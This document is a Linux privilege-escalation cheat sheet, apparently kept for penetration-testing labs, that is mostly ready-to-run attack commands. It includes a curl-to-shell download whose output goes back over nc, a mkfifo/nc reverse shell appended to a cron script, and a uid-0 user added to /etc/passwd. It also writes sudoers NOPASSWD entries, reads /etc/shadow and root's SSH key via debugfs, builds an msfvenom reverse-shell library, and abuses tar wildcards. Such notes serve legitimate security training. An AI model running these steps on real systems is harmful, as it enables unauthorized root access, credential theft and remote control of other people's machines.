---
title: Linux Privilege Escalation
---
# Enumeration

## Information Checklist
- Check current user context information with `id`
- Check sudo capabilities of user with `sudo -l`
- Check sudo version - If it is `1.8.31` use [this exploit](https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit)
- Check users with `/etc/passwd` or `cat /etc/passwd | cut -d':' -f1` to only get usernames
- Check hostname with `hostname`
- Check system information with `cat /etc/issue; cat /etc/*-release; uname -r; arch`
- Check running processes with `ps aux`
- Check network configuration with `ip a` or `ifconfig -a`
- Check routes with `route` or `routel`
- Check environment variables with `env`
- Check active network connections with `ss -anp` or `netstat -antup` - use `netstat -plunt` to only list listening connections
- Check for interesting strings in files recursively with `grep -Horn <text> <dir>` or   /path/to/downloaded/files`
- Check all scheduled jobs with `ls -lah /etc/cron*`
- Check users scheduled jobs with `crontab -l` or try `sudo crontab -l` if possible to show jobs run by root
- Check cron logs with `grep "CRON" /var/log/syslog`
- Check installed applications with `dpkg -l`
- Check writable folders with `find / -writable -type d 2>/dev/null`
- Check mount drives with `cat /etc/fstab` - use `mount` to list currently mounted drives
- Check available disks with `lsblk`
- Check loaded modules with `lsmod` - use `/sbin/modinfo <modulename>` to get more information on specific modules
- Check files that have `SUID` set with `find / -perm -u=s -type f 2>/dev/null` - Check [GTFOBins](https://gtfobins.github.io/)
- Check services with `systemctl --type=service --state=running`
- Check for arguments being sent to processes using `pspy`

## Inspecting User Trails
- We can try to find interesting files in the users home directory such as history-files or user-specific configurations in dotfiles like `.bashrc`
## Automated Enumeration
- We can automate enumeration using a various different tools like `linPEAS`, `linEnum` or `unix-privesc-check`
```zsh
./unix-privesc-check standard > output.txt

./linPEAS.sh | tee linresult.txt

# Excute from memory and send output back to the host
nc -lvnp 9002 | tee linpeas.out #Host
curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002 #Victim
```
> [!Warning]
> Automated tools might provide false information or miss information that can be gathered by manual enumeration! Never rely on automated tools alone!

## Inspecting processes
- We can use `pspy` or `ps` to look at processes and try to see if they are called with suspicious arguments
```zsh
watch -n 1 "ps -aux | grep pass"
```
- If we have `sudo` permissions to run `tcpdump` we can also try to perform a packet capture
```zsh
sudo tcpdump -i lo -A | grep "pass"
```
# Insecure File Permissions

## Abusing Cron Jobs
- Check running cron jobs
```zsh
`ls -lah /etc/cron*`

crontab -l 

sudo crontab -l

grep "CRON" /var/log/syslog
```
- If we have binaries or scripts involved in cron jobs that are being run with privileged users, check their permission
```zsh
ls -lah /home/alexa/.scripts/user_backups.sh
```
- If we can modify the files, we can add our payload
```zsh
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.234 9001 >/tmp/f" >> user_backups.sh
```

## Abusing Password Authentication
- Passwords are generally stored in `/etc/shadow`. For backwards compatibility however, sometimes hashed passwords are also stored in the second column of a user entry in `/etc/passwd` which is world readable
> [!IMPORTANT]
> The password entry in `/etc/passwd` if present, takes precedence over `/etc/shadow`

- We can create our own password and add it to `/etc/passwd` if we have write access
```zsh
openssl passwd init_12345
echo "root2:$1$uulseTDm$ZNn78UI7q/dpCMkLN5apR.:0:0:root:/root:/bin/bash" >> /etc/passwd
```
> [!WARNING]
> Always use `openssl` on the target if available. The output of the OpenSSL `passwd command may vary depending on the system executing it. On older systems, it may default to the DES algorithm, while on some newer systems it could output the password in MD5 format.

## Abusing Service Files
- If we can write to any `.service` we can modify it accordingly and trigger a malicious payload (i.e generated with `msfvenom`) under the `ExecStart` entry. We can also modify the `User` entry to get the payload to be executed by said user.
```zsh
[Unit]
Description=Python App
After=network-online.target

[Service]
Type=simple
WorkingDirectory=/home/alexa/python_app
ExecStart=/home/alexa/rev
TimeoutSec=30
RestartSec=15s
User=root
ExecReload=/bin/kill -USR1 $MAINPID
Restart=on-failure

[Install]
WantedBy=multi-user.target
```
- Other actions include `ExecStop` and `ExecReload`
- Also keep in mind that even if we can not modify the `service`file itself, it may use relative paths in its configuration (i.e `ExecStart=python /home/alexa/python_app.py`). If we have write access in any folder used by the PATH of systemd (check which PATH is used with  `systemctl show-environment`) we can place a malicious payload with the same name as the referenced executable.
> [!Important]
> In order to trigger this the service will need to be asked to perform the vulnerable action (**Start**, **Stop**, **Reload**). Also check if you can restart the system in order to trigger the **Start** action. 
# Abusing Linux System Components
## Abusing Setuid Binaries and Capabilities
- As per checklist find SUID binaries with `find / -perm -u=s -type f  2>/dev/null` 
- Use `getcap` to check capabilities
```zsh
/usr/sbin/getcap -r / 2>/dev/null
```
- Use [GFTOBins](https://gtfobins.github.io/) to look up potential privesc paths for improper SUID or capabilities on files

## Abusing SUDO
- Check `sudo` permission with `sudo -l`
> [!IMPORTANT]
> `sudo` versions 1.8.2 to 1.8.31p2 and all stable versions from 1.9.0 to 1.9.5p1 are vulnerable to CVE-2021-3156 also known as _Sudo Baron Samedit_ 
> We can find exploits on [worawit Github](https://github.com/worawit/CVE-2021-3156)or [this exploit](https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit)
- If we have weak permissions on the file `/etc/sudoers` or we have a SUID binary which allows us to write files, we can add our current user to the suoders file and grant us root access through sudo
```zsh
echo "alexa ALL=NOPASSWD:ALL" >> /etc/sudoers
```

## Abusing Group Memberships
- Check out [Interesting Groups - Linux Privesc](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/index.html) for a complete list of groupmemberships that might grant us additional privileges
### Disk group
- If we are part of the `disk` group we can ready any file on the machine
```zsh
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
- We can also write files except files owned by root (i.e `/etc/shadow`)
```zsh
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
## LD.SO Misconfiguration
- If the `LD_LIBRARY_PATH` path is writable we can add a shared library to it that might get get loaded by an executable executed by a higher privileged user (i.e via cronjob)
- To identify shared libraries loaded by executables we can use `ldd <filename>`
- To create a malicious library file we can use `msfvenom`
```zsh
msfvenom -p linux/x64/shell_reverse_tcp -f elf-so -o utils.so LHOST=192.168.45.237 LPORT=9001
```
```c
//Or manually compile the below C file with gcc -shared -o libcustom.so -fPIC libcustom.c

#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(){
    setuid(0);
    setgid(0);
    printf("I'm the bad library\n");
//try seting SUID on bash and get a root shell
    system("chmod +s /bin/bash");
//or alternatively try to run a command
    system("/bin/sh",NULL,NULL);
}
```
- After compiling the above and putting it in the shared library path, we need to wait for a **reboot** or for the root user to execute **`ldconfig`** (_in case you can execute this binary as **sudo** or it has the **suid bit** you will be able to execute it yourself_). 
- After can verify if it is being loaded again with `ldd <filename>`

# Using Exploits
- Check system information with `cat /etc/issue; cat /etc/*-release; uname -r; arch
- We can use `searchsploit` to check for quick wins
```zsh
sp "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8"
```
- If we find an exploit that might work, check the source, modify as needed and then compile
```zsh
gcc cve-2017-16995.c -o cve-2017-16995
```

# Wildcard abuse
- Check [Hacktricks](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/wildcards-spare-tricks.html) for common applications that can be abused when operating with wildcards
- If we find usage of a wildcard `*` in a `tar` command (i.e `tar -zcf /home/kali/TarWildCardPrivEsc/backup.tgz *` in a bash script that gets executed by another user) we can trick `tar` into interpreting filenames as parameters as shown [here](https://medium.com/@polygonben/linux-privilege-escalation-wildcards-with-tar-f79ab9e407fa)
```zsh
# 1. Create files in the current directory called  
# '--checkpoint=1' and '--checkpoint-action=exec=sh privesc.sh'  
  
echo "" > '--checkpoint=1'  
echo "" > '--checkpoint-action=exec=sh privesc.sh'  
  
# 2. Create a privesc.sh bash script, that allows for privilege escalation  
#privesc.sh:  
echo 'kali ALL=(root) NOPASSWD: ALL' > /etc/sudoers  
  
#The above injects an entry into the /etc/sudoers file that allows the 'kali' user to use sudo without a password for all commands  
#NOTE: we could have also used a reverse shell, this would work the same!  
#OR: Even more creative, you could've used chmod to changes the permissions on a binary to have SUID permissions, and PE that way:
cp /bin/bash /tmp/
chmod u+s /tmp/bash
./tmp/bash -p
```
>[!WARNING]
>Be sure to run the copied bash binary which has the SUID set with the `-p` parameter